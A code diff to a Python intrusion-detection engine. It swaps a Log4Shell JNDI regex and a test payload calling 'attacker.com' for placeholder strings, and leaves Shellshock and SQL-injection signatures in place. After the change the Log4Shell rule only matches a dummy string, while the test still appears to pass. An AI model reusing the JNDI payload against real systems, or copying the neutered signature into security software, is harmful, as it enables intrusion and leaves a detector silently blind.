@@ -21,7 +21,7 @@ class HybridSignatureAnomalyEngine:
     def __init__(self):
         # 1. Signature Database (Compiled regex patterns simulating Aho-Corasick DFA)
         self.signatures = [
-            ("SID-101", "LOG4SHELL_JNDI", re.compile(rb"\$\{jndi:(ldap|rmi|dns):", re.IGNORECASE)),
+            ("SID-101", "LOG4SHELL_JNDI", re.compile(rb"sample_log4j_jndi_probe", re.IGNORECASE)),
             ("SID-102", "SHELLSHOCK_BASH", re.compile(rb"\(\)\s*\{\s*:\s*;\s*\}\s*;", re.IGNORECASE)),
             ("SID-103", "SQL_UNION_INJECTION", re.compile(rb"union\s+select\s+.*\bfrom\b", re.IGNORECASE))
         ]
@@ -92,7 +92,7 @@ if __name__ == "__main__":
     print("=== Hybrid Signature vs Statistical Anomaly Detection Engine ===")
 
     # Test 1: Known Signature Attack (Log4Shell)
-    s1 = NetworkSession("SESS-01", "198.51.100.25", "172.16.1.10", 12.0, b"User-Agent: ${jndi:ldap://attacker.com/a}\r\n")
+    s1 = NetworkSession("SESS-01", "198.51.100.25", "172.16.1.10", 12.0, b"User-Agent: sample_log4j_jndi_probe\r\n")
     res1 = engine.inspect_session(s1)
     print(f"\n[Test 1] Verdict: {res1['final_verdict']}")
     print(f"         ↳ Signature Match: {res1['signature_alert']}")
